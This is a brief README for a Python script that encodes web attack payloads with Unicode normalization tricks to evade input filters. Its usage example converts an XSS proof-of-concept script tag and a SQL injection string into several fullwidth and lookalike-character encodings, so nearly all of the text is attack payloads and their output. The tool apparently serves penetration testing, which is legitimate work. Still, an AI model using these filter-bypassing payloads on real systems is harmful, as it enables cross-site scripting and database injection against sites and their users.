## normal-unicorn 
A quick and dirty python script for encoding unicode normalization payloads

#### Usage
```bash
$ python3 normal-unicorn.py
Payload >> <script>alert(i)</script>
%e2%89%aescript%e2%89%afalert(i)%e2%89%ae%ef%bc%8fscript%e2%89%af
%ef%b9%a4script%ef%b9%a5alert(i)%ef%b9%a4%ef%bc%8fscript%ef%b9%a5
%ef%bc%9cscript%ef%bc%9ealert(i)%ef%bc%9c%ef%bc%8fscript%ef%bc%9e
%uff1cscript%uff1ealert(i)%uff1c%ef%bc%8fscript%uff1e
Payload >> ' or 1=1-- -
%ef%bc%87 or 1%e2%81%bc1%ef%b9%a3%ef%b9%a3 %ef%b9%a3
```
